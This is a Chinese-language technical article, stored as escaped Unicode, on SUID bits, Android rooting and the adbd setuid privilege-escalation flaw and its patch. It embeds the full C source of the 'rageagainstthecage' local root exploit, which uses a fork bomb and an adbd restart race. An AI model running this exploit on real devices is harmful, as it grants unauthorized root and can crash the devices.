\u524d\u9762\u4ecb\u7ecd\u8fc7SUID\u4e0eSGID\u7684\u529f\u80fd\uff0c\u90a3\u4e48\uff0c\u5982\u4f55\u6253\u5f00\u6587\u4ef6\u4f7f\u5176\u6210\u4e3a\u5177\u6709SUID\u4e0eSGID\u7684\u6743\u9650\u5462\uff1f\u8fd9\u5c31\u9700\u8981\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u4e86\u3002\u73b0\u5728\u5e94\u8be5\u77e5\u9053\uff0c\u4f7f\u7528\u6570\u5b57\u66f4\u6539\u6743\u9650\u7684\u65b9\u5f0f\u4e3a\u201c3\u4e2a\u6570\u5b57\u201d\u7684\u7ec4\u5408\uff0c\u90a3\u4e48\uff0c\u5982\u679c\u5728\u8fd93\u4e2a\u6570\u5b57\u4e4b\u524d\u518d\u52a0\u4e0a\u4e00\u4e2a\u6570\u5b57\uff0c\u6700\u524d\u9762\u7684\u6570\u5b57\u5c31\u8868\u793a\u8fd9\u51e0\u4e2a\u5c5e\u6027\u4e86\uff08\u6ce8\uff1a\u901a\u5e38\u6211\u4eec\u4f7f\u7528chmod 0777 filename\u7684\u65b9\u5f0f\u6765\u8bbe\u7f6efilename\u7684\u5c5e\u6027\u65f6\uff0c\u5219\u662f\u5047\u8bbe\u6ca1\u6709SUID\u3001SGID\u53caSticky bit\uff09\u3002 4\u4e3aSUID 2\u4e3aSGID 1\u4e3aSticky bit \u5047\u8bbe\u8981\u5c06\u4e00\u4e2a\u6587\u4ef6\u5c5e\u6027\u6539\u4e3a\u201c-rwsr-xr-x\u201d\uff0c\u7531\u4e8es\u5728\u7528\u6237\u6743\u9650\u4e2d\uff0c\u6240\u4ee5\u662fSUID\uff0c\u56e0\u6b64\uff0c\u5728\u539f\u5148\u7684755\u4e4b\u524d\u8fd8\u8981\u52a0\u4e0a4\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u201cchmod 4755 filename\u201d\u6765\u8bbe\u7f6e\u3002 SUID\u4e5f\u53ef\u4ee5\u7528\u201cchmod u+s filename\u201d\u6765\u8bbe\u7f6e\uff0c\u201cchmod u-s filename\u201d\u6765\u53d6\u6d88SUID\u8bbe\u7f6e\uff1b\u540c\u6837\uff0cSGID\u53ef\u4ee5\u7528\u201cchmod g+s filename\u201d\uff0c\u201cchmod g-s filename\u201d\u6765\u53d6\u6d88SGID\u8bbe\u7f6e\u3002 Android \u7cfb\u7edfroot\u7834\u89e3\u539f\u7406\u5206\u6790 \u83b7\u5f97root\u6743\u9650\u7684\u4ee3\u7801\u5982\u4e0b\uff1a Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os =new DataOutputStream(process.getOutputStream()); ...... os.writeBytes(\"exit\\n\"); os.flush(); process.waitFor(); \u4ece\u4e0a\u9762\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9996\u5148\u8981\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u5176\u5b9eroot\u7684\u79d8\u5bc6\u90fd\u5728su\u7a0b\u5e8f\u4e2d\uff0cAndroid\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\u53ea\u80fdroot\u548cshell\u53ef\u4ee5\u7528\u8fd0\u884csu\uff0c\u5982\u679c\u628a\u8fd9\u4e2a\u9650\u5236\u62ff\u6389\uff0c\u5c31\u662froot\u7834\u89e3\u4e86\uff01 \u4e0b\u9762\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\u662f\u600e\u6837\u83b7\u5f97root\u6743\u9650\u7684\uff0c\u5982\u679c\u5bf9Linux\u7684su\u547d\u4ee4\u719f\u6089\u7684\u670b\u53cb\u53ef\u80fd\u77e5\u9053su\u7a0b\u5e8f\u90fd\u8bbe\u7f6eSUID\u4f4d\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e0b\u5df2\u7ecfroot\u7834\u89e3\u4e0a\u7684su\u6743\u9650\u8bbe\u7f6e\uff0c \u6211\u4eec\u53d1\u73b0su\u7684\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\uff0c\u662f\u5176\u5b9e\u662fbusybox\u7684\u8f6f\u94fe\u63a5\uff0c\u6211\u4eec\u67e5\u770bbusybox\u7684\u5c5e\u6027\u53d1\u73b0\uff0c\u5176\u8bbe\u7f6e\u4e86SUID\u548cSGID\uff0c\u5e76\u4e14\u6240\u6709\u8005\u548c\u6240\u6709\u7ec4\u90fd\u662froot\u3002\u8fd9\u6837\u8fd0\u884cbusybox\u7684\u666e\u901a\u7528\u6237\uff0cbusybox\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u83b7\u5f97\u7684\u662froot\u7684\u6709\u6548\u7528\u6237\u3002su\u7a0b\u5e8f\u5219\u662f\u628a\u81ea\u5df1\u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5e76\u628a\u81ea\u5df1\u6743\u9650\u63d0\u5347\u81f3root\uff08\u6211\u4eec\u524d\u9762\u63d0\u5230su\u5176\u5b9e\u5c31\u662fbusybox\uff0c\u8fd0\u884c\u671f\u5b83\u7684\u6743\u9650\u662froot\uff0c\u5f53\u7136\u4e5f\u6709\u6743\u9650\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 \u518d\u5f3a\u8c03\u4e00\u4e0b\u4e0d\u5149root\u624b\u673a\u4e0asu\u9700\u8981\u8bbe\u7f6eSUID\uff0c\u6240\u6709\u7684Linux\u7cfb\u7edf\u4e0a\u7684su\u7a0b\u5e8f\u90fd\u9700\u8981\u8bbe\u7f6eSUID\u4f4d\u3002 \u6211\u4eec\u53d1\u73b0su\u4e5f\u8bbe\u7f6e\u4e86SUID\u4f4d\uff0c\u8fd9\u6837\u666e\u901a\u7528\u6237\u4e5f\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0csu\u7a0b\u5e8f\u4f1a\u9a8c\u8bc1root \u5bc6\u7801\uff0c\u5982\u679c\u6b63\u786esu\u7a0b\u5e8f\u53ef\u4ee5\u628a\u7528\u6237\u6743\u9650\u63d0\u9ad8\u7684root\uff08\u56e0\u4e3a\u5176\u8bbe\u7f6eSUID\u4f4d\uff0c\u8fd0\u884c\u671f\u662froot\u6743\u9650\uff0c\u8fd9\u6837\u5176\u6709\u6743\u9650\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff09\u3002 Android\u7cfb\u7edf\u7684\u7834\u89e3\u7684\u6839\u672c\u539f\u7406\u5c31\u662f\u66ff\u6362\u6389\u7cfb\u7edf\u4e2d\u7684su\u7a0b\u5e8f\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7684\u9ed8\u8ba4su\u7a0b\u5e8f\u9700\u8981\u9a8c\u8bc1\u5b9e\u9645\u7528\u6237\u6743\u9650\uff08\u53ea\u6709root\u548cshell\u7528\u6237\u624d\u6709\u6743\u8fd0\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684su\u7a0b\u5e8f\uff0c\u5176\u4ed6\u7528\u6237\u8fd0\u884c\u90fd\u4f1a\u8fd4\u56de\u9519\u8bef\uff09\u3002\u800c\u7834\u89e3\u540e\u7684su\u5c06\u4e0d\u68c0\u67e5\u5b9e\u9645\u7528\u6237\u6743\u9650\uff0c\u8fd9\u6837\u666e\u901a\u7684\u7528\u6237\u4e5f\u5c06\u53ef\u4ee5\u8fd0\u884csu\u7a0b\u5e8f\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u7a0b\u5e8f\u5c06\u81ea\u5df1\u7684\u6743\u9650\u63d0\u5347\u3002 root\u7834\u89e3\u6ca1\u6709\u5229\u7528\u4ec0\u4e48Linux\u5185\u6838\u6f0f\u6d1e\uff08Linux\u5185\u6838\u4e0d\u53ef\u80fd\u6709\u8fd9\u4e48\u5927\u7684\u6f0f\u6d1e\u5b58\u5728\uff09\uff0c\u53ef\u4ee5\u7406\u89e3\u6210root\u7834\u89e3\u5c31\u662f\u5728\u4f60\u7cfb\u7edf\u4e2d\u690d\u5165\u201c\u6728\u9a6csu\u201d\uff0c\u8bf4\u5b83\u662f\u201c\u6728\u9a6c\u201d\u4e00\u70b9\u513f\u90fd\u4e0d\u4e3a\u8fc7\uff0c\u5047\u5982\u6076\u610f\u7a0b\u5e8f\u5728\u7cfb\u7edf\u4e2d\u8fd0\u884c\u4e5f\u53ef\u4ee5\u901a\u8fc7su\u6765\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\u7684\u8fd9\u6837\u7684\u7ed3\u679c\u5c06\u4f1a\u662f\u707e\u96be\u6027\u7684\u3002\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0broot\u8fc7\u624b\u673a\u90fd\u4f1a\u6709\u4e00\u4e2aSuperUser\u5e94\u7528\u7a0b\u5e8f\u6765\u8ba9\u7528\u6237\u7ba1\u7406\u5141\u8bb8\u8c01\u83b7\u5f97root\u6743\u9650.\u4f46\u662f\u8981\u66ff\u6362\u6389\u7cfb\u7edf\u4e2dsu\u7a0b\u5e8f\u672c\u8eab\u5c31\u662f\u9700\u8981root\u6743\u9650\u7684\uff0c\u600e\u6837\u5728root\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\uff0c\u5047\u8bbe\u9700\u8981\u7834\u89e3\u7684Android\u7cfb\u7edf\u5177\u5907\u5982\u4e0b\u6761\u4ef6\uff1a 1\u3001\u53ef\u4ee5\u901a\u8fc7adb\u8fde\u63a5\u5230\u8bbe\u5907\uff0c\u4e00\u822c\u610f\u5473\u7740\u9a71\u52a8\u7a0b\u5e8f\u5df2\u7ecf\u5b89\u88c5\u3002 2\u3001\u4f46\u662fadb\u83b7\u5f97\u7528\u6237\u6743\u9650\u662fshell\u7528\u6237\uff0c\u800c\u4e0d\u662froot\u3002 \u5148\u4e86\u89e3\u4e00\u4e0badb\u5de5\u5177\uff0c\u8bbe\u5907\u7aef\u6709adbd\u670d\u52a1\u7a0b\u5e8f\u540e\u53f0\u8fd0\u884c\uff0c\u4e3a\u5f00\u53d1\u673a\u7684adb\u7a0b\u5e8f\u63d0\u4f9b\u670d\u52a1\uff0cadbd\u7684\u6743\u9650\uff0c\u51b3\u5b9a\u4e86adb\u7684\u6743\u9650\u3002\u5177\u4f53\u7528\u6237\u53ef\u67e5\u770b/system/core/adb\u4e0b\u7684\u6e90\u7801\uff0c\u67e5\u770bAndroid.mk\u4f60\u5c06\u4f1a\u53d1\u73b0adb\u548cadbd\u5176\u5b9e\u662f\u4e00\u4efd\u4ee3\u7801\uff0c\u7136\u540e\u901a\u8fc7\u5b8f\u6765\u7f16\u8bd1\u3002 \u67e5\u770badb.c\u7684adb_main\u51fd\u6570\u4f60\u5c06\u4f1a\u53d1\u73b0adbd\u4e2d\u6709\u5982\u4e0b\u4ee3\u7801\uff1a 1:int adb_main(int is_daemon) 2: { 3: ...... 4: property_get(\"ro.secure\", value,\"\"); 5: if (strcmp(value,\"1\") == 0) { 6: // don't run as root if ro.secure is set... 7: secure = 1; 8: ...... 9: } 10: 11: if (secure) { 12: ...... 13: setgid(AID_SHELL); 14: setuid(AID_SHELL); 15: ...... 16: } 17: } \u4ece\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230adbd\u4f1a\u68c0\u6d4b\u7cfb\u7edf\u7684ro.secure\u5c5e\u6027\uff0c\u5982\u679c\u8be5\u5c5e\u6027\u4e3a1\u5219\u5c06\u4f1a\u628a\u81ea\u5df1\u7684\u7528\u6237\u6743\u9650\u964d\u7ea7\u6210shell\u7528\u6237\u3002\u4e00\u822c\u8bbe\u5907\u51fa\u5382\u7684\u65f6\u5019\u5728/default.prop\u6587\u4ef6\u4e2d\u90fd\u4f1a\u6709\uff1a 1: ro.secure=1 \u8fd9\u6837\u5c06\u4f1a\u4f7fadbd\u542f\u52a8\u7684\u65f6\u5019\u81ea\u52a8\u964d\u7ea7\u6210shell\u7528\u6237\u3002 \u7136\u540e\u6211\u4eec\u518d\u4ecb\u7ecd\u4e00\u4e0badbd\u5728\u4ec0\u4e48\u65f6\u5019\u542f\u52a8\u7684\u5462\uff1f\u7b54\u6848\u662f\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u7531init\u8fdb\u7a0b\u542f\u52a8\u3002\u6211\u4eec\u67e5\u770binit.rc\u4e2d\u6709\u5982\u4e0b\u5185\u5bb9\uff1a 1: # adbd is controlled by the persist.service.adb.enable system property 2: service adbd /sbin/adbd 3: disabled \u5bf9Android\u5c5e\u6027\u7cfb\u7edf\u5c11\u6709\u4e86\u89e3\u7684\u670b\u53cb\u5c06\u4f1a\u77e5\u9053\uff0c\u5728init.rc\u4e2d\u914d\u7f6e\u7684\u7cfb\u7edf\u670d\u52a1\u542f\u52a8\u7684\u65f6\u5019\u90fd\u662froot\u6743\u9650\uff08\u56e0\u4e3ainit\u8fdb\u884c\u662froot\u6743\u9650\uff0c\u5176\u5b50\u7a0b\u5e8f\u4e5f\u662froot\uff09\u3002\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5728adbd\u7a0b\u5e8f\u5728\u6267\u884c\uff1a 1:/* then switch user and group to \"shell\" */ 2: setgid(AID_SHELL); 3: setuid(AID_SHELL); \u4ee3\u7801\u4e4b\u524d\u90fd\u662froot\u6743\u9650\uff0c\u53ea\u6709\u6267\u884c\u8fd9\u4e24\u53e5\u4e4b\u540e\u624d\u53d8\u6210shell\u6743\u9650\u7684\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f15\u51faroot\u7834\u89e3\u8fc7\u7a0b\u4e2d\u83b7\u5f97root\u6743\u9650\u7684\u65b9\u6cd5\u4e86\uff0c\u90a3\u5c31\u662f\u8ba9\u4e0a\u9762setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c31\u662f\u964d\u7ea7\u5931\u8d25\uff0c\u90a3\u5c31\u7ee7\u7eed\u5728root\u6743\u9650\u4e0b\u9762\u8fd0\u884c\u4e86\u3002 \u8fd9\u91cc\u9762\u505a\u4e00\u4e2a\u7b80\u5355\u8bf4\u660e\uff1a 1\u3001\u51fa\u5382\u8bbe\u7f6e\u7684ro.secure\u5c5e\u6027\u4e3a1\uff0c\u5219adbd\u4e5f\u5c06\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 2\u3001adb\u5de5\u5177\u521b\u5efa\u7684\u8fdb\u7a0bratc\u4e5f\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff1b 3\u3001ratc\u4e00\u76f4\u521b\u5efa\u5b50\u8fdb\u7a0b\uff08ratc\u521b\u5efa\u7684\u5b50\u7a0b\u5e8f\u4e5f\u5c06\u4f1a\u8fd0\u884c\u5728shell\u7528\u6237\u6743\u9650\u4e0b\uff09\uff0c\u7d27\u63a5\u7740\u5b50\u7a0b\u5e8f\u9000\u51fa\uff0c\u5f62\u6210\u50f5\u5c38\u8fdb\u7a0b\uff0c\u5360\u7528shell\u7528\u6237\u7684\u8fdb\u7a0b\u8d44\u6e90\uff0c\u76f4\u5230\u5230\u8fbeshell\u7528\u6237\u7684\u8fdb\u7a0b\u6570\u4e3aRLIMIT_NPROC\u7684\u65f6\u5019\uff08\u5305\u62ecadbd\u3001ratc\u53ca\u5176\u5b50\u7a0b\u5e8f\uff09\uff0c\u8fd9\u662fratc\u5c06\u4f1a\u521b\u5efa\u5b50\u8fdb\u7a0b\u5931\u8d25\u3002\u8fd9\u65f6\u5019\u6740\u6389adbd\uff0cadbd\u8fdb\u7a0b\u56e0\u4e3a\u662fAndroid\u7cfb\u7edf\u670d\u52a1\uff0c\u5c06\u4f1a\u88abAndroid\u7cfb\u7edf\u81ea\u52a8\u91cd\u542f\uff0c\u8fd9\u65f6\u5019ratc\u4e5f\u5728\u7ade\u4e89\u4ea7\u751f\u5b50\u7a0b\u5e8f\u3002\u5728adbd\u7a0b\u5e8f\u6267\u884c\u4e0a\u9762setgid\u548csetuid\u4e4b\u524d\uff0cratc\u5df2\u7ecf\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\uff0c\u90a3\u4e48shell\u7528\u6237\u7684\u8fdb\u7a0b\u9650\u989d\u5df2\u7ecf\u8fbe\u5230\uff0c\u5219adbd\u8fdb\u7a0b\u6267\u884csetgid\u548csetuid\u5c06\u4f1a\u5931\u8d25\u3002\u6839\u636e\u4ee3\u7801\u6211\u4eec\u53d1\u73b0\u5931\u8d25\u4e4b\u540eadbd\u5c06\u4f1a\u7ee7\u7eed\u6267\u884c\u3002\u8fd9\u6837adbd\u8fdb\u7a0b\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 \u8fd9\u65f6\u91cd\u65b0\u7528adb\u8fde\u63a5\u8bbe\u5907\uff0c\u5219adb\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 \u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u53d1\u73b0\u5229\u7528RageAgainstTheCage\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7fadbd\u83b7\u5f97root\u6743\u9650\uff0c\u4e5f\u5c31\u662fadb\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u62ff\u5230root\u6743\u9650\u5269\u4e0b\u7684\u95ee\u9898\u5c31\u597d\u529e\u4e86\uff0c\u590d\u5236\u7834\u89e3\u4e4b\u540e\u7684su\u7a0b\u5e8f\u5230\u7cfb\u7edf\u4e2d\uff0c\u90fd\u662f\u6ca1\u6709\u4ec0\u4e48\u6280\u672f\u542b\u91cf\u7684\u4e8b\u60c5\u4e86\u3002 \u5176\u5b9e\u5835\u4f4fadbd\u7684\u8fd9\u4e2a\u6f0f\u6d1e\u5176\u5b9e\u4e5f\u633a\u7b80\u5355\u7684\uff0c\u65b0\u7248\u672c\u5df2\u7ecf\u52a0\u4e24\u4e2a\u8fd9\u4e2a\u8865\u4e01\u3002 1:/* then switch user and group to \"shell\" */ 2:if (setgid(AID_SHELL) != 0) { 3: exit(1); 4: } 5:if (setuid(AID_SHELL) != 0) { 6: exit(1); 7: } \u5982\u679c\u53d1\u73b0setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u5219adbd\u8fdb\u7a0b\u5f02\u5e38\u9000\u51fa\uff0c\u5c31\u628a\u8fd9\u4e2a\u6f0f\u6d1e\u7ed9\u5835\u4e0a\u4e86\u3002 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2607 http://blog.claudxiao.net/wp-content/uploads/2011/04/rageagainstthecage.c /* android 1.x/2.x adb setuid() root exploit * (C) 2010 The Android Exploid Crew * * Needs to be executed via adb -d shell. It may take a while until * all process slots are filled and the adb connection is reset. * * !!!This is PoC code for educational purposes only!!! * If you run it, it might crash your device and make it unusable! * So you use it at your own risk! */ #include <stdio.h> #include <sys/types.h> #include <sys/time.h> #include <sys/resource.h> #include <unistd.h> #include <fcntl.h> #include <errno.h> #include <string.h> #include <signal.h> #include <stdlib.h> void die(const char *msg) { perror(msg); exit(errno); } pid_t find_adb() { char buf[256]; int i = 0, fd = 0; pid_t found = 0; for (i = 0; i < 32000; ++i) { sprintf(buf, \"/proc/%d/cmdline\", i); if ((fd = open(buf, O_RDONLY)) < 0) continue; memset(buf, 0, sizeof(buf)); read(fd, buf, sizeof(buf) - 1); close(fd); if (strstr(buf, \"/sbin/adb\")) { found = i; break; } } return found; } void restart_adb(pid_t pid) { kill(pid, 9); } void wait_for_root_adb(pid_t old_adb) { pid_t p = 0; for (;;) { p = find_adb(); if (p != 0 && p != old_adb) break; sleep(1); } sleep(5); kill(-1, 9); } int main(int argc, char **argv) { pid_t adb_pid = 0, p; int pids = 0, new_pids = 1; int pepe[2]; char c = 0; struct rlimit rl; printf(\"[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\\n\\n\"); printf(\"[*] checking NPROC limit ...\\n\"); if (getrlimit(RLIMIT_NPROC, &rl) < 0) die(\"[-] getrlimit\"); if (rl.rlim_cur == RLIM_INFINITY) { printf(\"[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\\n\"); exit(1); } printf(\"[+] RLIMIT_NPROC={%lu, %lu}\\n\", rl.rlim_cur, rl.rlim_max); printf(\"[*] Searching for adb ...\\n\"); adb_pid = find_adb(); if (!adb_pid) die(\"[-] Cannot find adb\"); printf(\"[+] Found adb as PID %d\\n\", adb_pid); printf(\"[*] Spawning children. Dont type anything and wait for reset!\\n\"); printf(\"[*]\\n[*] If you like what we are doing you can send us PayPal money to\\n\" \"[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\\n\" \"[*] If you are a company and feel like you profit from our work,\\n\" \"[*] we also accept donations > 1000 USD!\\n\"); printf(\"[*]\\n[*] adb connection will be reset. restart adb server on desktop and re-login.\\n\"); sleep(5); if (fork() > 0) exit(0); setsid(); pipe(pepe); /* generate many (zombie) shell-user processes so restarting * adb's setuid() will fail. * The whole thing is a bit racy, since when we kill adb * there is one more process slot left which we need to * fill before adb reaches setuid(). Thats why we fork-bomb * in a seprate process. */ if (fork() == 0) { close(pepe[0]); for (;;) { if ((p = fork()) == 0) { exit(0); } else if (p < 0) { if (new_pids) { printf(\"\\n[+] Forked %d childs.\\n\", pids); new_pids = 0; write(pepe[1], &c, 1); close(pepe[1]); } } else { ++pids; } } } close(pepe[1]); read(pepe[0], &c, 1); restart_adb(adb_pid); if (fork() == 0) { fork(); for (;;) sleep(0x743C); } wait_for_root_adb(adb_pid); return 0; } Android\u7a0b\u5e8f\u7684\u5b89\u5168\u7cfb\u7edf \u5728Android\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u4e3a\u6bcf\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08apk\uff09\u521b\u5efa\u4e86\u4e00\u4e2a\u7528\u6237\u548c\u7ec4\u3002\u8fd9\u4e2a\u7528\u6237\u548c\u7ec4\u90fd\u662f\u53d7\u9650\u7528\u6237\uff0c\u4e0d\u80fd\u8bbf\u95ee\u7cfb\u7edf\u7684\u6570\u636e\uff0c\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u5f53\u7136\u5b83\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u8fd9\u6837\u8bbe\u8ba1\u53ef\u4ee5\u5c3d\u53ef\u80fd\u5730\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u5065\u58ee\u6027\u3002 \u4f46\u662f\u6709\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u9700\u8981\u8bbf\u95ee\u4e00\u4e9b\u7cfb\u7edf\u8d44\u6e90\u7684\u3002\u6bd4\u5982Setting\u7a0b\u5e8f\uff0c\u5b83\u9700\u8981\u8bbf\u95eeWiFi\uff0c\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u5220\u9664\u6587\u4ef6\u7b49\u7b49\u64cd\u4f5c\u3002\u600e\u6837\u505a\u5230\u8fd9\u4e00\u70b9\u513f\u5462\uff1fAndroid\u901a\u8fc7\u4e00\u5b9a\u9014\u5f84\u53ef\u4ee5\u83b7\u5f97system\u6743\u9650\u3002\u83b7\u5f97system\u7528\u6237\u6743\u9650\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u4e00\u822c\u60c5\u51b5\u4e0bsystem\u7528\u6237\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u548c\u5220\u9664\u6587\u4ef6\uff0c\u8bbf\u95ee\u8bbe\u5907\u7b49\u7b49\u3002\u4f46\u662f\u6709\u4e9b\u60c5\u51b5\u4e0bsystem\u6743\u9650\u8fd8\u662f\u4e0d\u591f\u7684\u3002\u6bd4\u5982\uff1a\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0cifconfig\u547d\u4ee4\u662f\u9700\u8981root\u6743\u9650\u7684\u3002\u6211\u53ef\u4ee5\u5f88\u80af\u5b9a\u7684\u8bf4\uff0c\u5728Android\u4e0b\u9762\u5e94\u7528\u7a0b\u5e8f\u662f\u6ca1\u6709\u53ef\u80fd\u62ff\u5230root\u6743\u9650\u7684\u3002\u4f46\u662f\u5982\u679c\u6211\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981root\u6743\u9650\u600e\u4e48\u529e\u5462\uff1f\u53ea\u80fd\u60f3\u529e\u6cd5\u7ed5\u822c\u8fc7\u53bb\u3002\u5c31\u4ee5\u6211\u7684\u95ee\u9898\u4e3a\u4f8b\uff0c\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0croot\u6743\u9650\u4e0b\u9762\u547d\u4ee4\u4e3a\uff1a ifconfig eth0 192.168.1.188 \u5728\u666e\u901a\u7528\u6237\u6216\u8005system\u7528\u6237\u6743\u9650\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fd4\u56de\u5931\u8d25\u548c\u5f02\u5e38\uff0c\u90a3\u4e48\u600e\u6837\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u5462\u3002 1\u3001\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019init\u8fdb\u7a0b\u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u5904\u4e8eroot\u7528\u6237\u6743\u9650\u4e0b\u9762\u3002\u7528\u6765\u76d1\u542c\u7cfb\u7edf\u4e2d\u5e94\u7528\u7a0b\u5e8f\u7684\u8bf7\u6c42\uff08\u53ef\u4ee5\u7528socket\u5b9e\u73b0\uff09\uff0c\u5e76\u4ee3\u5176\u5b8c\u6210\u3002\u8fd9\u6837\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u6267\u884croot\u7528\u6237\u6743\u9650\u7684\u4efb\u52a1\u4e86\u3002 2\u3001\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u7684\u8bbe\u5907\uff0c\u8be5\u8bbe\u5907\u7684\u529f\u80fd\u5c31\u662f\u5728\u5185\u6838\u6001\u5e2e\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u76f8\u5e94\u7684\u547d\u4ee4\u3002Linux\u5185\u6838\u6001\u6ca1\u6709\u6743\u9650\u7684\u95ee\u9898\u4e86\u3002\u80af\u5b9a\u53ef\u4ee5\u6267\u884c\u6210\u529f\u3002 \u89e3\u51b3\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\u95ee\u9898\u65f6\uff0c\u9009\u62e9\u662f\u540e\u8005\u76f8\u5bf9\u6765\u8bf4\u8bbe\u8ba1\u6bd4\u8f83\u7b80\u5355\u3002 Android\u5e94\u7528\u7a0b\u5e8f\u5229\u7528init.rc service\u83b7\u5f97root\u6743\u9650 \u53d1\u5e03\u4e8e: \u60f3\u5728android\u5e94\u7528\u7a0b\u5e8f\u4e2d\u52a8\u6001mount\u4e00\u4e2aNFS\u7684\u7cfb\u7edf\uff0c\u4f46\u662f\u6267\u884cmount\u547d\u4ee4\u5fc5\u987b\u8981root\u6743\u9650\u624d\u53ef\u4ee5\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5728Android\u7684APK\u5c42\u662f\u4e0d\u80fd\u83b7\u5f97root\u6743\u9650\u7684\u3002 \u4e0a\u4e00\u8282\u63d0\u5230\u5b9e\u73b0\u7531init\u542f\u52a8\u7684Service\uff0c\u6765\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u6216\u8005\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u8bbe\u5907\uff0c\u8fd9\u4e2a\u8bbe\u5907\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002 \u672c\u6587\u5c06\u4f1a\u9009\u62e9\u7b2c\u4e00\u79cd\u6765\u89e3\u51b3Android\u5e94\u7528\u7a0b\u5e8fmount NFS\u6587\u4ef6\u7cfb\u7edf\u7684\u95ee\u9898\u3002 Init.rc Service \u5728Android\u7cfb\u7edfinit.rc\u4e2d\u5b9a\u4e49\u5f88\u591aService\uff0cInit.rc\u4e2d\u5b9a\u4e49\u7684Service\u5c06\u4f1a\u88abInit\u8fdb\u7a0b\u521b\u5efa\uff0c\u8fd9\u6837\u5c06\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\u3002 